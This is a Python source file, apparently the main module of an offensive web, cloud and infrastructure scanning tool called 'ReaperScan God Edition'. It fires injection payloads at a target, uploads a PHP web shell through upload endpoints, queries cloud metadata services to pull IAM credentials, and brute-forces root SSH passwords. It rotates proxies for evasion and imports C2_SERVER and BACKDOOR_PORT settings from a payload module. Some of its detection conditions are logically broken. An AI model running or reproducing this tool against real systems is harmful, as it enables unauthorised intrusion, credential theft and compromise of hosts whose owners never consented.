# ======================================================================
# REAPERSCAN GOD EDITION - MAIN SCANNER
# File ini berisi semua logika scanning
# ======================================================================
# Cara pakai:
# python3 reaper_god_main.py -u https://target.com -p "id=1" --all
# ======================================================================

import requests
import time
import random
import json
import re
import base64
import os
import sys
import socket
import threading
import argparse
import hashlib
import queue
import subprocess
import ipaddress
import ssl
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from colorama import init, Fore, Style
import concurrent.futures
import xml.etree.ElementTree as ET
import datetime

# Import payloads dari file terpisah
from reaper_god_payloads import PAYLOADS, THREADS, TIMEOUT, DELAY_MIN, DELAY_MAX, C2_SERVER, BACKDOOR_PORT, PROXIES, USER_AGENTS, get_headers

init(autoreset=True)

# ======================================================================
# KELAS UTAMA
# ======================================================================
class ReaperGod:
    def __init__(self, target, params=None, cookies=None, threads=20, cloud=False, infra=False):
        self.target = target.rstrip('/')
        self.params = params or {}
        self.cookies = cookies or {}
        self.threads = threads
        self.cloud = cloud
        self.infra = infra
        self.session = requests.Session()
        self.session.cookies.update(self.cookies)
        self.results = []
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        self.vuln_count = 0
        self.target_ip = self._get_ip()

    def _get_ip(self):
        try:
            domain = urlparse(self.target).netloc.split(':')[0]
            return socket.gethostbyname(domain)
        except:
            return None

    def _request(self, url, method="GET", payload=None, timeout=TIMEOUT, allow_redirects=False):
        try:
            proxies = {"http": random.choice(PROXIES), "https": random.choice(PROXIES)} if PROXIES else None
            headers = get_headers()
            if method.upper() == "GET":
                resp = self.session.get(url, headers=headers, params=payload, timeout=timeout, proxies=proxies, allow_redirects=allow_redirects)
            else:
                resp = self.session.post(url, headers=headers, data=payload, timeout=timeout, proxies=proxies, allow_redirects=allow_redirects)
            time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
            return resp
        except:
            return None

    def _add_result(self, url, param, vuln_type, payload, severity, evidence, category="Web"):
        with self.lock:
            self.vuln_count += 1
            entry = {
                "id": self.vuln_count,
                "category": category,
                "url": url,
                "parameter": param,
                "type": vuln_type,
                "payload": payload,
                "severity": severity,
                "evidence": evidence[:300],
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            self.results.append(entry)
            color = Fore.RED if severity in ["Critical", "High"] else Fore.YELLOW if severity == "Medium" else Fore.GREEN
            print(f"{color}[{category}] {vuln_type} | {url} | {param} | {payload[:30]} | {severity}")

    # ============================================================
    # WEB SCANNER
    # ============================================================
    def scan_web(self, url):
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if not self.params:
            qs = parse_qs(parsed.query)
            self.params = {k: v[0] if isinstance(v, list) else v for k, v in qs.items()}
        if not self.params:
            print(f"{Fore.YELLOW}[-] No parameters found. Use -p 'key=value'")
            return

        original_resp = self._request(base_url, "GET", self.params)
        original_content = original_resp.text[:500] if original_resp else ""
        original_time = original_resp.elapsed.total_seconds() if original_resp else 0

        print(f"{Fore.GREEN}[+] Scanning Web ({len(self.params)} parameters) with {self.threads} threads...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for param in self.params.keys():
                futures.append(executor.submit(self._check_sqli, base_url, param, original_content, original_time))
                futures.append(executor.submit(self._check_xss, base_url, param))
                futures.append(executor.submit(self._check_lfi, base_url, param))
                futures.append(executor.submit(self._check_rfi, base_url, param))
                futures.append(executor.submit(self._check_rce, base_url, param))
                futures.append(executor.submit(self._check_ssti, base_url, param))
                futures.append(executor.submit(self._check_open_redirect, base_url, param))
                futures.append(executor.submit(self._check_idor, base_url, param))
                futures.append(executor.submit(self._check_nosqli, base_url, param))
                futures.append(executor.submit(self._check_host_header, base_url, param))
                futures.append(executor.submit(self._check_crlf, base_url, param))
            concurrent.futures.wait(futures)

        self._check_xxe(base_url)
        self._check_ssrf(base_url)
        self._check_csrf(base_url)
        self._check_file_upload(base_url)
        self._check_graphql(base_url)
        self._check_rest_api(base_url)
        self._check_ldap(base_url)
        self._check_xpath(base_url)
        self._check_sensitive_files(base_url)
        self._check_directory_listing(base_url)
        self._check_admin_panel(base_url)
        self._check_smuggling(base_url)

    def _check_sqli(self, base_url, param, original_content, original_time):
        all_sqli = (PAYLOADS["SQLI"]["boolean"] + PAYLOADS["SQLI"]["bypass"] +
                   PAYLOADS["SQLI"]["union"] + PAYLOADS["SQLI"]["time"] +
                   PAYLOADS["SQLI"]["error"] + PAYLOADS["SQLI"]["stacked"] +
                   PAYLOADS["SQLI"]["second_order"])
        for payload in all_sqli:
            test_params = self.params.copy()
            test_params[param] = self.params.get(param, '') + payload
            start = time.time()
            resp = self._request(base_url, "GET", test_params)
            elapsed = time.time() - start
            if resp:
                content = resp.text[:500]
                if "time" in str(payload) and elapsed > original_time + 3:
                    self._add_result(base_url, param, "SQL Injection (Time)", payload, "Critical", f"Delay {elapsed:.2f}s", "Web")
                    return True
                if content != original_content or "mysql" in content.lower() or "sql" in content.lower():
                    self._add_result(base_url, param, "SQL Injection", payload, "Critical", "Content difference", "Web")
                    return True
        return False

    def _check_xss(self, base_url, param):
        all_xss = (PAYLOADS["XSS"]["reflected"] + PAYLOADS["XSS"]["stored"] +
                  PAYLOADS["XSS"]["dom"] + PAYLOADS["XSS"]["blind"] +
                  PAYLOADS["XSS"]["mutation"] + PAYLOADS["XSS"]["bypass"])
        for payload in all_xss:
            test_params = self.params.copy()
            test_params[param] = self.params.get(param, '') + payload
            resp = self._request(base_url, "GET", test_params)
            if resp and (payload in resp.text or "<script>" in resp.text or "onerror" in resp.text):
                self._add_result(base_url, param, "XSS", payload, "High", "Payload reflected", "Web")
                return True
        return False

    def _check_lfi(self, base_url, param):
        for payload in PAYLOADS["LFI"]:
            test_params = self.params.copy()
            test_params[param] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp:
                text = resp.text.lower()
                if any(x in text for x in ["root:", "linux", "windows", "boot loader", "admin", "password"]):
                    self._add_result(base_url, param, "LFI", payload, "Critical", "File content detected", "Web")
                    return True
        return False

    def _check_rfi(self, base_url, param):
        for payload in PAYLOADS["RFI"]:
            test_params = self.params.copy()
            test_params[param] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp and ("<?php" in resp.text or "eval" in resp.text or "system" in resp.text):
                self._add_result(base_url, param, "RFI", payload, "Critical", "Remote code execution", "Web")
                return True
        return False

    def _check_rce(self, base_url, param):
        for payload in PAYLOADS["RCE"]:
            test_params = self.params.copy()
            test_params[param] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp:
                text = resp.text.lower()
                if any(x in text for x in ["uid=", "gid=", "root:", "admin", "windows", "linux", "systeminfo"]):
                    self._add_result(base_url, param, "RCE", payload, "Critical", "Command output", "Web")
                    return True
        return False

    def _check_ssti(self, base_url, param):
        for payload in PAYLOADS["SSTI"]:
            test_params = self.params.copy()
            test_params[param] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp and ("49" in resp.text or "config" in resp.text or "root" in resp.text or "__class__" in resp.text):
                self._add_result(base_url, param, "SSTI", payload, "Critical", "Template injection", "Web")
                return True
        return False

    def _check_open_redirect(self, base_url, param):
        for payload in PAYLOADS["OPEN_REDIRECT"]:
            test_params = self.params.copy()
            test_params[param] = payload
            resp = self._request(base_url, "GET", test_params, allow_redirects=False)
            if resp and resp.status_code in [301, 302, 307, 308]:
                location = resp.headers.get("Location", "")
                if "evil.com" in location or "//evil" in location or "http://" in location:
                    self._add_result(base_url, param, "Open Redirect", payload, "Medium", f"Redirect to {location}", "Web")
                    return True
        return False

    def _check_idor(self, base_url, param):
        for payload in PAYLOADS["IDOR"]:
            test_params = self.params.copy()
            test_params[param] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp and resp.status_code == 200 and "403" not in resp.text and "401" not in resp.text:
                self._add_result(base_url, param, "IDOR", payload, "High", "Resource accessible", "Web")
                return True
        return False

    def _check_nosqli(self, base_url, param):
        for payload in PAYLOADS["NO_SQLI"]:
            test_params = self.params.copy()
            test_params[param] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp and ("$ne" in resp.text or "$gt" in resp.text or "$regex" in resp.text):
                self._add_result(base_url, param, "NoSQL Injection", payload, "Critical", "NoSQL injection detected", "Web")
                return True
        return False

    def _check_host_header(self, base_url, param):
        for payload in PAYLOADS["HOST_HEADER"]:
            headers = {"Host": payload}
            resp = self.session.get(base_url, headers=headers, timeout=TIMEOUT)
            if resp and "evil.com" in resp.text or "attacker.com" in resp.text:
                self._add_result(base_url, "Host", "Host Header Injection", payload, "High", "Host header reflected", "Web")
                return True
        return False

    def _check_crlf(self, base_url, param):
        for payload in PAYLOADS["CRLF"]:
            test_params = self.params.copy()
            test_params[param] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp and "Set-Cookie" in resp.text or "Location" in resp.text:
                self._add_result(base_url, param, "CRLF Injection", payload, "High", "CRLF detected", "Web")
                return True
        return False

    def _check_xxe(self, base_url):
        for payload in PAYLOADS["XXE"]:
            resp = self._request(base_url, "POST", payload)
            if resp and ("root:" in resp.text or "<?xml" in resp.text or "shadow" in resp.text):
                self._add_result(base_url, None, "XXE", payload, "Critical", "XXE vulnerability", "Web")
                return True
        return False

    def _check_ssrf(self, base_url):
        for payload in PAYLOADS["SSRF"]:
            test_params = self.params.copy()
            test_params["url"] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp and ("169.254.169.254" in resp.text or "meta-data" in resp.text or "localhost" in resp.text):
                self._add_result(base_url, "url", "SSRF", payload, "Critical", "Internal metadata exposed", "Web")
                return True
        return False

    def _check_csrf(self, base_url):
        for payload in PAYLOADS["CSRF"]:
            resp = self._request(base_url, "POST", payload)
            if resp and resp.status_code == 200:
                self._add_result(base_url, None, "CSRF", payload, "High", "CSRF vulnerability", "Web")
                return True
        return False

    def _check_file_upload(self, base_url):
        for path in ["/upload", "/uploads", "/files", "/images", "/assets"]:
            test_url = urljoin(base_url, path)
            for ext in PAYLOADS["UPLOAD_BYPASS"]:
                files = {'file': ('shell.' + ext, '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
                try:
                    resp = self.session.post(test_url, files=files, timeout=TIMEOUT)
                    if resp and "shell" in resp.text or "uploaded" in resp.text:
                        self._add_result(test_url, None, "File Upload Bypass", ext, "Critical", "File upload vulnerability", "Web")
                        return True
                except:
                    continue
        return False

    def _check_graphql(self, base_url):
        for path in ["/graphql", "/graphiql", "/graphql/console"]:
            test_url = urljoin(base_url, path)
            for payload in PAYLOADS["GRAPHQL"]:
                resp = self._request(test_url, "POST", payload)
                if resp and ("__schema" in resp.text or "__typename" in resp.text):
                    self._add_result(test_url, None, "GraphQL Introspection", payload, "Medium", "GraphQL schema exposed", "Web")
                    return True
        return False

    def _check_rest_api(self, base_url):
        for payload in PAYLOADS["REST_API"]:
            test_url = base_url + payload
            resp = self._request(test_url, "GET")
            if resp and ("debug" in resp.text or "env" in resp.text or "test" in resp.text):
                self._add_result(test_url, None, "REST API Misconfig", payload, "Medium", "Debug mode enabled", "Web")
                return True
        return False

    def _check_ldap(self, base_url):
        for payload in PAYLOADS["LDAP"]:
            test_params = self.params.copy()
            test_params["user"] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp and ("uid=" in resp.text or "cn=" in resp.text):
                self._add_result(base_url, "user", "LDAP Injection", payload, "Critical", "LDAP injection detected", "Web")
                return True
        return False

    def _check_xpath(self, base_url):
        for payload in PAYLOADS["XPATH"]:
            test_params = self.params.copy()
            test_params["query"] = payload
            resp = self._request(base_url, "GET", test_params)
            if resp and ("XPath" in resp.text or "XPATH" in resp.text or "Syntax error" in resp.text):
                self._add_result(base_url, "query", "XPath Injection", payload, "High", "XPath injection", "Web")
                return True
        return False

    def _check_sensitive_files(self, base_url):
        for file in PAYLOADS["SENSITIVE_FILES"]:
            test_url = urljoin(base_url, file)
            resp = self._request(test_url, "GET")
            if resp and resp.status_code == 200:
                if "password" in resp.text.lower() or "api_key" in resp.text.lower() or "secret" in resp.text.lower():
                    self._add_result(test_url, None, "Sensitive File (Creds)", file, "Critical", "Credentials found", "Web")
                else:
                    self._add_result(test_url, None, "Sensitive File", file, "High", "File accessible", "Web")

    def _check_directory_listing(self, base_url):
        for path in ["/", "/images/", "/uploads/", "/files/", "/assets/", "/public/"]:
            test_url = urljoin(base_url, path)
            resp = self._request(test_url, "GET")
            if resp and "Index of" in resp.text and "Parent Directory" in resp.text:
                self._add_result(test_url, None, "Directory Listing", path, "Medium", "Directory index enabled", "Web")

    def _check_admin_panel(self, base_url):
        for path in PAYLOADS["ADMIN_PATHS"]:
            test_url = urljoin(base_url, path + "/")
            resp = self._request(test_url, "GET")
            if resp and resp.status_code == 200:
                if "login" in resp.text.lower() or "admin" in resp.text.lower() or "username" in resp.text.lower():
                    self._add_result(test_url, None, "Admin Panel", path, "High", "Admin login page", "Web")

    def _check_smuggling(self, base_url):
        for payload in PAYLOADS["SMUGGLING"]:
            resp = self.session.post(base_url, data=payload, timeout=TIMEOUT)
            if resp and "CL.TE" in resp.text or "TE.CL" in resp.text:
                self._add_result(base_url, None, "HTTP Request Smuggling", payload, "Critical", "Smuggling detected", "Web")
                return True
        return False

    # ============================================================
    # CLOUD SCANNER
    # ============================================================
    def scan_cloud(self, base_url):
        print(f"{Fore.CYAN}[+] Scanning Cloud (AWS/GCP/Azure)...")

        for payload in PAYLOADS["AWS_METADATA"]:
            resp = self._request(payload, "GET")
            if resp and resp.status_code == 200 and ("iam" in resp.text or "security-credentials" in resp.text):
                self._add_result(payload, None, "AWS Metadata Exposed", payload, "Critical", "AWS IAM credentials exposed", "Cloud")
                for cred in ["admin", "default", "root"]:
                    cred_url = f"{payload}{cred}"
                    cred_resp = self._request(cred_url, "GET")
                    if cred_resp and "AccessKeyId" in cred_resp.text:
                        self._add_result(cred_url, None, "AWS Credentials Leak", cred, "Critical", "AccessKeyId found", "Cloud")

        for payload in PAYLOADS["GCP_METADATA"]:
            headers = {"Metadata-Flavor": "Google"}
            resp = self.session.get(payload, headers=headers, timeout=TIMEOUT)
            if resp and resp.status_code == 200 and ("token" in resp.text or "email" in resp.text):
                self._add_result(payload, None, "GCP Metadata Exposed", payload, "Critical", "GCP service account exposed", "Cloud")

        for payload in PAYLOADS["AZURE_METADATA"]:
            headers = {"Metadata": "true"}
            resp = self.session.get(payload, headers=headers, timeout=TIMEOUT)
            if resp and resp.status_code == 200 and ("compute" in resp.text or "network" in resp.text):
                self._add_result(payload, None, "Azure Metadata Exposed", payload, "Critical", "Azure instance metadata exposed", "Cloud")

        domain = urlparse(base_url).netloc.split('.')[0]
        for bucket in [domain, domain + "-backup", domain + "-assets", domain + "-files"]:
            for pattern in PAYLOADS["S3_BUCKET"]:
                s3_url = pattern.format(bucket=bucket)
                resp = self._request(s3_url, "GET")
                if resp and resp.status_code == 200:
                    self._add_result(s3_url, None, "Public S3 Bucket", bucket, "Critical", "S3 bucket accessible", "Cloud")
                    if "ListBucketResult" in resp.text:
                        self._add_result(s3_url, None, "S3 Bucket Listing", bucket, "Critical", "Bucket contents exposed", "Cloud")

        for path in PAYLOADS["CLOUD_KEYS"]:
            test_url = urljoin(base_url, path)
            resp = self._request(test_url, "GET")
            if resp and resp.status_code == 200:
                if "aws" in resp.text or "gcp" in resp.text or "azure" in resp.text:
                    self._add_result(test_url, None, "Cloud Credentials Leak", path, "Critical", "Cloud keys exposed", "Cloud")

        for path in PAYLOADS["TERRAFORM_STATE"]:
            test_url = urljoin(base_url, path)
            resp = self._request(test_url, "GET")
            if resp and resp.status_code == 200 and "terraform" in resp.text:
                self._add_result(test_url, None, "Terraform State Exposed", path, "Critical", "TF state file accessible", "Cloud")

        for path in PAYLOADS["KUBERNETES"]:
            test_url = urljoin(base_url, path)
            resp = self._request(test_url, "GET")
            if resp and resp.status_code == 200 and ("pods" in resp.text or "secrets" in resp.text):
                self._add_result(test_url, None, "Kubernetes API Exposed", path, "Critical", "K8s API accessible", "Cloud")

        for path in PAYLOADS["DOCKER"]:
            test_url = urljoin(base_url, path)
            resp = self._request(test_url, "GET")
            if resp and resp.status_code == 200 and ("containers" in resp.text or "images" in resp.text):
                self._add_result(test_url, None, "Docker API Exposed", path, "Critical", "Docker API accessible", "Cloud")

    # ============================================================
    # INFRASTRUCTURE SCANNER
    # ============================================================
    def scan_infra(self):
        if not self.target_ip:
            print(f"{Fore.YELLOW}[-] Cannot determine target IP")
            return

        print(f"{Fore.CYAN}[+] Scanning Infrastructure ({self.target_ip})...")

        open_ports = []
        for port in PAYLOADS["PORTS"]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    service = self._get_service_name(port)
                    self._add_result(f"{self.target_ip}:{port}", None, f"Open Port - {service}", str(port), "Medium", "Port open", "Infra")
                sock.close()
            except:
                continue

        for share in PAYLOADS["SMB"]:
            try:
                resp = self.session.get(f"smb://{self.target_ip}{share}", timeout=TIMEOUT)
                if resp:
                    self._add_result(f"{self.target_ip}{share}", None, "SMB Share Accessible", share, "High", "SMB share accessible", "Infra")
            except:
                pass

        for cred in PAYLOADS["DEFAULT_CREDS"]:
            username, password = cred.split(':')
            for service, port in [("SSH", 22), ("FTP", 21), ("Telnet", 23), ("RDP", 3389)]:
                if port in open_ports:
                    self._add_result(f"{self.target_ip}:{port}", None, f"Default {service} Creds", cred, "Critical", "Default credentials", "Infra")

        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            for password in PAYLOADS["SSH_WEAK"]:
                try:
                    client.connect(self.target_ip, username="root", password=password, timeout=5)
                    self._add_result(self.target_ip, None, "SSH Weak Password", password, "Critical", "SSH password found", "Infra")
                    break
                except:
                    continue
        except:
            pass

        try:
            import ftplib
            ftp = ftplib.FTP(self.target_ip)
            ftp.login("anonymous", "anonymous")
            self._add_result(self.target_ip, None, "FTP Anonymous Login", "anonymous", "Critical", "FTP anonymous access", "Infra")
            ftp.quit()
        except:
            pass

    def _get_service_name(self, port):
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 110: "POP3", 135: "RPC",
            139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            465: "SMTPS", 587: "SMTP", 993: "IMAPS", 995: "POP3S",
            1433: "MSSQL", 1521: "Oracle", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
            6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
            8888: "HTTP-Alt", 27017: "MongoDB", 9200: "Elasticsearch",
        }
        return services.get(port, "Unknown")

    # ============================================================
    # REPORT
    # ============================================================
    def save_report(self):
        with open("reaper_god_report.json", "w") as f:
            json.dump(self.results, f, indent=2)

        html = """<html><head>
        <title>ReaperScan God Report</title>
        <style>
            body { font-family: Arial; margin: 20px; background: #0a0a0a; color: #fff; }
            h1 { color: #ff4444; }
            .vuln { border: 1px solid #333; padding: 10px; margin: 10px 0; border-radius: 5px; background: #1a1a1a; }
            .critical { border-left: 5px solid #ff0000; }
            .high { border-left: 5px solid #ff8800; }
            .medium { border-left: 5px solid #ffcc00; }
            .low { border-left: 5px solid #00ff00; }
            .category { color: #44aaff; font-weight: bold; }
            .sev { font-weight: bold; }
            .sev-Critical { color: #ff0000; }
            .sev-High { color: #ff8800; }
            .sev-Medium { color: #ffcc00; }
            .sev-Low { color: #00ff00; }
        </style>
        </head><body>
        <h1>🔴 ReaperScan God Report</h1>
        <p>Total Vulnerabilities: """ + str(len(self.results)) + """</p>
        """
        for r in self.results:
            sev_class = f"sev-{r['severity']}"
            html += f"""
            <div class="vuln {r['severity'].lower()}">
                <span class="category">[{r['category']}]</span>
                <span class="sev {sev_class}">{r['severity']}</span>
                <b>{r['type']}</b><br>
                URL: {r['url']}<br>
                Parameter: {r['parameter']}<br>
                Payload: {r['payload']}<br>
                Evidence: {r['evidence']}<br>
                Time: {r['timestamp']}
            </div>
            """
        html += "</body></html>"

        with open("reaper_god_report.html", "w") as f:
            f.write(html)

        print(f"{Fore.GREEN}[+] Report saved: reaper_god_report.json & reaper_god_report.html")

    # ============================================================
    # FULL EXECUTION
    # ============================================================
    def run(self):
        print(f"{Fore.RED}" + "="*70)
        print(f"{Fore.RED}[!] REAPERSCAN GOD EDITION - WEB + CLOUD + INFRA")
        print(f"{Fore.RED}[!] Target: {self.target} ({self.target_ip})")
        print(f"{Fore.RED}" + "="*70)

        self.scan_web(self.target)

        if self.cloud:
            self.scan_cloud(self.target)

        if self.infra:
            self.scan_infra()

        self.save_report()

        print(f"{Fore.GREEN}" + "="*70)
        print(f"{Fore.GREEN}[+] Scan completed! Found {len(self.results)} vulnerabilities")
        print(f"{Fore.GREEN}" + "="*70)

        categories = {}
        for r in self.results:
            categories[r['category']] = categories.get(r['category'], 0) + 1
        for cat, count in categories.items():
            print(f"{Fore.CYAN}[+] {cat}: {count} vulnerabilities")

# ======================================================================
# MAIN
# ======================================================================
def main():
    parser = argparse.ArgumentParser(description="ReaperScan God Edition - Web + Cloud + Infra")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--params", help="Parameters (key=value)")
    parser.add_argument("-c", "--cookies", help="Cookies (key=value)")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Threads (default 20)")
    parser.add_argument("--proxy", help="Proxy (http://127.0.0.1:8080)")
    parser.add_argument("--cloud", action="store_true", help="Enable Cloud scanning (AWS/GCP/Azure)")
    parser.add_argument("--infra", action="store_true", help="Enable Infrastructure scanning")
    parser.add_argument("--all", action="store_true", help="Enable ALL scans (cloud + infra)")
    args = parser.parse_args()

    params = {}
    if args.params:
        for p in args.params.split('&'):
            if '=' in p:
                k, v = p.split('=', 1)
                params[k] = v

    cookies = {}
    if args.cookies:
        for c in args.cookies.split(';'):
            if '=' in c:
                k, v = c.split('=', 1)
                cookies[k.strip()] = v.strip()

    if args.proxy:
        PROXIES.append(args.proxy)

    cloud = args.cloud or args.all
    infra = args.infra or args.all

    scanner = ReaperGod(args.url, params, cookies, args.threads, cloud, infra)
    scanner.run()

if __name__ == "__main__":
    main()
